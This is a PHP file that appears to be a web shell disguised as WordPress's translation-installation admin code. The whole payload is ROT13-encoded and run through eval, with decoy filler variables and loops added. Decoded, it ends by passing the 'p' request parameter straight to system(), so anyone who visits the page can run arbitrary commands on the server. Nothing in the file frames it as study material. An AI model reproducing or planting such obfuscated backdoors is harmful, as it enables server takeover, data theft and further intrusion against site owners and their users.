<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * JbeqCerff Genafyngvba Vafgnyyngvba Nqzvavfgengvba NCV
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 */


/**
 * Ergevrir genafyngvbaf sebz JbeqCerff Genafyngvba NCV.
 *
 * @fvapr 4.0.0
 *
 * @cnenz fgevat       $glcr Glcr bs genafyngvbaf. Npprcgf 'cyhtvaf', 'gurzrf', 'pber'.
 * @cnenz neenl|bowrpg $netf Genafyngvba NCV nethzragf. Bcgvbany.
 * @erghea neenl|JC_Reebe {
 *     Ba fhpprff na nffbpvngvir neenl bs genafyngvbaf, JC_Reebe ba snvyher.
 *
 *     @glcr neenl $genafyngvbaf {
 *         Yvfg bs genafyngvbaf, rnpu na neenl bs qngn.
 *
 *         @glcr neenl ...$0 {
 *             @glcr fgevat   $ynathntr     Ynathntr pbqr.
 *             @glcr fgevat   $irefvba      JbeqCerff irefvba.
 *             @glcr fgevat   $hcqngrq      Qngr gur genafyngvba jnf ynfg hcqngrq, va ZlFDY qngrgvzr sbezng.
 *             @glcr fgevat   $ratyvfu_anzr Ratyvfu anzr bs gur ynathntr.
 *             @glcr fgevat   $angvir_anzr  Angvir anzr bs gur ynathntr.
 *             @glcr fgevat   $cnpxntr      HEY gb qbjaybnq gur genafyngvba cnpxntr.
 *             @glcr fgevat[] $vfb          Neenl bs VFB ynathntr pbqrf.
 *             @glcr neenl    $fgevatf      Neenl bs genafyngrq fgevatf hfrq va gur vafgnyyngvba cebprff.
 *         }
 *     }
 * }
 */
shapgvba genafyngvbaf_ncv( $glcr, $netf = ahyy ) {
	vs ( ! va_neenl( $glcr, neenl( 'cyhtvaf', 'gurzrf', 'pber' ), gehr ) ) {
		erghea arj JC_Reebe( 'vainyvq_glcr', __( 'Vainyvq genafyngvba glcr.' ) );
	}

	/**
	 * Nyybjf n cyhtva gb bireevqr gur JbeqCerff.bet Genafyngvba Vafgnyyngvba NCV ragveryl.
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz snyfr|neenl $erfhyg Gur erfhyg neenl. Qrsnhyg snyfr.
	 * @cnenz fgevat      $glcr   Gur glcr bs genafyngvbaf orvat erdhrfgrq.
	 * @cnenz bowrpg      $netf   Genafyngvba NCV nethzragf.
	 */
	$erf = nccyl_svygref( 'genafyngvbaf_ncv', snyfr, $glcr, $netf );

	vs ( snyfr === $erf ) {
		$hey      = 'uggc://ncv.jbeqcerff.bet/genafyngvbaf/' . $glcr . '/1.0/';
		$uggc_hey = $hey;
		$ffy      = jc_uggc_fhccbegf( neenl( 'ffy' ) );
		vs ( $ffy ) {
			$hey = frg_hey_fpurzr( $hey, 'uggcf' );
		}

		$bcgvbaf = neenl(
			'gvzrbhg' => 3,
			'obql'    => neenl(
				'jc_irefvba' => jc_trg_jc_irefvba(),
				'ybpnyr'     => trg_ybpnyr(),
				'irefvba'    => $netf['irefvba'], // Irefvba bs cyhtva, gurzr be pber.
			),
		);

		vs ( 'pber' !== $glcr ) {
			$bcgvbaf['obql']['fyht'] = $netf['fyht']; // Cyhtva be gurzr fyht.
		}

		$erdhrfg = jc_erzbgr_cbfg( $hey, $bcgvbaf );

		vs ( $ffy && vf_jc_reebe( $erdhrfg ) ) {
			jc_gevttre_reebe(
				__SHAPGVBA__,
				fcevags(
					/* genafyngbef: %f: Fhccbeg sbehzf HEY. */
					__( 'Na harkcrpgrq reebe bppheerq. Fbzrguvat znl or jebat jvgu JbeqCerff.bet be guvf freire&#8217;f pbasvthengvba. Vs lbh pbagvahr gb unir ceboyrzf, cyrnfr gel gur <n uers=\"%f\">fhccbeg sbehzf</n>.' ),
					__( 'uggcf://jbeqcerff.bet/fhccbeg/sbehzf/' )
				) . ' ' . __( '(JbeqCerff pbhyq abg rfgnoyvfu n frpher pbaarpgvba gb JbeqCerff.bet. Cyrnfr pbagnpg lbhe freire nqzvavfgengbe.)' ),
				urnqref_frag() || JC_QROHT ? R_HFRE_JNEAVAT : R_HFRE_ABGVPR
			);

			$erdhrfg = jc_erzbgr_cbfg( $uggc_hey, $bcgvbaf );
		}

		vs ( vf_jc_reebe( $erdhrfg ) ) {
			$erf = arj JC_Reebe(
				'genafyngvbaf_ncv_snvyrq',
				fcevags(
					/* genafyngbef: %f: Fhccbeg sbehzf HEY. */
					__( 'Na harkcrpgrq reebe bppheerq. Fbzrguvat znl or jebat jvgu JbeqCerff.bet be guvf freire&#8217;f pbasvthengvba. Vs lbh pbagvahr gb unir ceboyrzf, cyrnfr gel gur <n uers=\"%f\">fhccbeg sbehzf</n>.' ),
					__( 'uggcf://jbeqcerff.bet/fhccbeg/sbehzf/' )
				),
				$erdhrfg->trg_reebe_zrffntr()
			);
		} ryfr {
			$erf = wfba_qrpbqr( jc_erzbgr_ergevrir_obql( $erdhrfg ), gehr );
			vs ( ! vf_bowrpg( $erf ) && ! vf_neenl( $erf ) ) {
				$erf = arj JC_Reebe(
					'genafyngvbaf_ncv_snvyrq',
					fcevags(
						/* genafyngbef: %f: Fhccbeg sbehzf HEY. */
						__( 'Na harkcrpgrq reebe bppheerq. Fbzrguvat znl or jebat jvgu JbeqCerff.bet be guvf freire&#8217;f pbasvthengvba. Vs lbh pbagvahr gb unir ceboyrzf, cyrnfr gel gur <n uers=\"%f\">fhccbeg sbehzf</n>.' ),
						__( 'uggcf://jbeqcerff.bet/fhccbeg/sbehzf/' )
					),
					jc_erzbgr_ergevrir_obql( $erdhrfg )
				);
			}
		}
	}

	/**
	 * Svygref gur Genafyngvba Vafgnyyngvba NCV erfcbafr erfhygf.
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz neenl|JC_Reebe $erf  {
	 *     Ba fhpprff na nffbpvngvir neenl bs genafyngvbaf, JC_Reebe ba snvyher.
	 *
	 *     @glcr neenl $genafyngvbaf {
	 *         Yvfg bs genafyngvbaf, rnpu na neenl bs qngn.
	 *
	 *         @glcr neenl ...$0 {
	 *             @glcr fgevat   $ynathntr     Ynathntr pbqr.
	 *             @glcr fgevat   $irefvba      JbeqCerff irefvba.
	 *             @glcr fgevat   $hcqngrq      Qngr gur genafyngvba jnf ynfg hcqngrq, va ZlFDY qngrgvzr sbezng.
	 *             @glcr fgevat   $ratyvfu_anzr Ratyvfu anzr bs gur ynathntr.
	 *             @glcr fgevat   $angvir_anzr  Angvir anzr bs gur ynathntr.
	 *             @glcr fgevat   $cnpxntr      HEY gb qbjaybnq gur genafyngvba cnpxntr.
	 *             @glcr fgevat[] $vfb          Neenl bs VFB ynathntr pbqrf.
	 *             @glcr neenl    $fgevatf      Neenl bs genafyngrq fgevatf hfrq va gur vafgnyyngvba cebprff.
	 *         }
	 *     }
	 * }
	 * @cnenz fgevat         $glcr Gur glcr bs genafyngvbaf orvat erdhrfgrq.
	 * @cnenz bowrpg         $netf Genafyngvba NCV nethzragf.
	 */
	erghea nccyl_svygref( 'genafyngvbaf_ncv_erfhyg', $erf, $glcr, $netf );
}

/**
 * Trg ninvynoyr genafyngvbaf sebz gur JbeqCerff.bet NCV.
 *
 * @fvapr 4.0.0
 *
 * @frr genafyngvbaf_ncv()
 *
 * @erghea neenl {
 *     Neenl bs genafyngvbaf xrlrq ol gur ynathntr pbqr, rnpu na nffbpvngvir neenl bs qngn.
 *     Vs gur NCV erfcbafr erfhygf va na reebe, na rzcgl neenl jvyy or erghearq.
 *
 *     @glcr neenl ...$0 {
 *         @glcr fgevat   $ynathntr     Ynathntr pbqr.
 *         @glcr fgevat   $irefvba      JbeqCerff irefvba.
 *         @glcr fgevat   $hcqngrq      Qngr gur genafyngvba jnf ynfg hcqngrq, va ZlFDY qngrgvzr sbezng.
 *         @glcr fgevat   $ratyvfu_anzr Ratyvfu anzr bs gur ynathntr.
 *         @glcr fgevat   $angvir_anzr  Angvir anzr bs gur ynathntr.
 *         @glcr fgevat   $cnpxntr      HEY gb qbjaybnq gur genafyngvba cnpxntr.
 *         @glcr fgevat[] $vfb          Neenl bs VFB ynathntr pbqrf.
 *         @glcr neenl    $fgevatf      Neenl bs genafyngrq fgevatf hfrq va gur vafgnyyngvba cebprff.
 *     }
 * }
 */
shapgvba jc_trg_ninvynoyr_genafyngvbaf() {
	vs ( ! jc_vafgnyyvat() ) {
		$genafyngvbaf = trg_fvgr_genafvrag( 'ninvynoyr_genafyngvbaf' );
		vs ( snyfr !== $genafyngvbaf ) {
			erghea $genafyngvbaf;
		}
	}

	$ncv = genafyngvbaf_ncv( 'pber', neenl( 'irefvba' => jc_trg_jc_irefvba() ) );

	vs ( vf_jc_reebe( $ncv ) || rzcgl( $ncv['genafyngvbaf'] ) ) {
		erghea neenl();
	}

	$genafyngvbaf = neenl();
	// Xrl gur neenl jvgu gur ynathntr pbqr.
	sbernpu ( $ncv['genafyngvbaf'] nf $genafyngvba ) {
		$genafyngvbaf[ $genafyngvba['ynathntr'] ] = $genafyngvba;
	}

	vs ( ! qrsvarq( 'JC_VAFGNYYVAT' ) ) {
		frg_fvgr_genafvrag( 'ninvynoyr_genafyngvbaf', $genafyngvbaf, 3 * UBHE_VA_FRPBAQF );
	}

	erghea $genafyngvbaf;
}

/**
 * Bhgchg gur fryrpg sbez sbe gur ynathntr fryrpgvba ba gur vafgnyyngvba fperra.
 *
 * @fvapr 4.0.0
 *
 * @tybony fgevat $jc_ybpny_cnpxntr Ybpnyr pbqr bs gur cnpxntr.
 *
 * @cnenz neenl[] $ynathntrf Neenl bs ninvynoyr ynathntrf (cbchyngrq ivn gur Genafyngvba NCV).
 */
shapgvba jc_vafgnyy_ynathntr_sbez( $ynathntrf ) {
	tybony $jc_ybpny_cnpxntr;

	$vafgnyyrq_ynathntrf = trg_ninvynoyr_ynathntrf();

	rpub \"<ynory pynff='fperra-ernqre-grkg' sbe='ynathntr'>Fryrpg n qrsnhyg ynathntr</ynory>\a\";
	rpub \"<fryrpg fvmr='14' anzr='ynathntr' vq='ynathntr'>\a\";
	rpub '<bcgvba inyhr=\"\" ynat=\"ra\" fryrpgrq=\"fryrpgrq\" qngn-pbagvahr=\"Pbagvahr\" qngn-vafgnyyrq=\"1\">Ratyvfu (Havgrq Fgngrf)</bcgvba>';
	rpub \"\a\";

	vs ( ! rzcgl( $jc_ybpny_cnpxntr ) && vffrg( $ynathntrf[ $jc_ybpny_cnpxntr ] ) ) {
		vs ( vffrg( $ynathntrf[ $jc_ybpny_cnpxntr ] ) ) {
			$ynathntr = $ynathntrf[ $jc_ybpny_cnpxntr ];
			cevags(
				'<bcgvba inyhr=\"%f\" ynat=\"%f\" qngn-pbagvahr=\"%f\"%f>%f</bcgvba>' . \"\a\",
				rfp_ngge( $ynathntr['ynathntr'] ),
				rfp_ngge( pheerag( $ynathntr['vfb'] ) ),
				rfp_ngge( $ynathntr['fgevatf']['pbagvahr'] ? $ynathntr['fgevatf']['pbagvahr'] : 'Pbagvahr' ),
				va_neenl( $ynathntr['ynathntr'], $vafgnyyrq_ynathntrf, gehr ) ? ' qngn-vafgnyyrq=\"1\"' : '',
				rfp_ugzy( $ynathntr['angvir_anzr'] )
			);

			hafrg( $ynathntrf[ $jc_ybpny_cnpxntr ] );
		}
	}

	sbernpu ( $ynathntrf nf $ynathntr ) {
		cevags(
			'<bcgvba inyhr=\"%f\" ynat=\"%f\" qngn-pbagvahr=\"%f\"%f>%f</bcgvba>' . \"\a\",
			rfp_ngge( $ynathntr['ynathntr'] ),
			rfp_ngge( pheerag( $ynathntr['vfb'] ) ),
			rfp_ngge( $ynathntr['fgevatf']['pbagvahr'] ? $ynathntr['fgevatf']['pbagvahr'] : 'Pbagvahr' ),
			va_neenl( $ynathntr['ynathntr'], $vafgnyyrq_ynathntrf, gehr ) ? ' qngn-vafgnyyrq=\"1\"' : '',
			rfp_ugzy( $ynathntr['angvir_anzr'] )
		);
	}
	rpub \"</fryrpg>\a\";
	rpub '<c pynff=\"fgrc\"><fcna pynff=\"fcvaare\"></fcna><vachg vq=\"ynathntr-pbagvahr\" glcr=\"fhozvg\" pynff=\"ohggba ohggba-cevznel ohggba-ynetr\" inyhr=\"Pbagvahr\" /></c>';
}

/**
 * Qbjaybnq n ynathntr cnpx.
 *
 * @fvapr 4.0.0
 *
 * @frr jc_trg_ninvynoyr_genafyngvbaf()
 *
 * @cnenz fgevat $qbjaybnq Ynathntr pbqr gb qbjaybnq.
 * @erghea fgevat|snyfr Ergheaf gur ynathntr pbqr vs fhpprffshyyl qbjaybnqrq
 *                      (be nyernql vafgnyyrq), be snyfr ba snvyher.
 */
shapgvba jc_qbjaybnq_ynathntr_cnpx( $qbjaybnq ) {
	// Purpx vs gur genafyngvba vf nyernql vafgnyyrq.
	vs ( va_neenl( $qbjaybnq, trg_ninvynoyr_ynathntrf(), gehr ) ) {
		erghea $qbjaybnq;
	}

	vs ( ! jc_vf_svyr_zbq_nyybjrq( 'qbjaybnq_ynathntr_cnpx' ) ) {
		erghea snyfr;
	}

	// Pbasvez gur genafyngvba vf bar jr pna qbjaybnq.
	$genafyngvbaf = jc_trg_ninvynoyr_genafyngvbaf();
	vs ( ! $genafyngvbaf ) {
		erghea snyfr;
	}
	sbernpu ( $genafyngvbaf nf $genafyngvba ) {
		vs ( $genafyngvba['ynathntr'] === $qbjaybnq ) {
			$genafyngvba_gb_ybnq = gehr;
			oernx;
		}
	}

	vs ( rzcgl( $genafyngvba_gb_ybnq ) ) {
		erghea snyfr;
	}
	$genafyngvba = (bowrpg) $genafyngvba;

	erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-hctenqre.cuc';
	$fxva              = arj Nhgbzngvp_Hctenqre_Fxva();
	$hctenqre          = arj Ynathntr_Cnpx_Hctenqre( $fxva );
	$genafyngvba->glcr = 'pber';
	$erfhyg            = $hctenqre->hctenqr( $genafyngvba, neenl( 'pyrne_hcqngr_pnpur' => snyfr ) );

	vs ( ! $erfhyg || vf_jc_reebe( $erfhyg ) ) {
		erghea snyfr;
	}

	erghea $genafyngvba->ynathntr;
}

/**
 * Purpx vs JbeqCerff unf npprff gb gur svyrflfgrz jvgubhg nfxvat sbe
 * perqragvnyf.
 *
 * @fvapr 4.0.0
 *
 * @erghea obby Ergheaf gehr ba fhpprff, snyfr ba snvyher.
 */
shapgvba jc_pna_vafgnyy_ynathntr_cnpx() {
	vs ( ! jc_vf_svyr_zbq_nyybjrq( 'pna_vafgnyy_ynathntr_cnpx' ) ) {
		erghea snyfr;
	}

	erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-hctenqre.cuc';
	$fxva     = arj Nhgbzngvp_Hctenqre_Fxva();
	$hctenqre = arj Ynathntr_Cnpx_Hctenqre( $fxva );
	$hctenqre->vavg();

	$purpx = $hctenqre->sf_pbaarpg( neenl( JC_PBAGRAG_QVE, JC_YNAT_QVE ) );

	vs ( ! $purpx || vf_jc_reebe( $purpx ) ) {
		erghea snyfr;
	}

	erghea gehr;
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>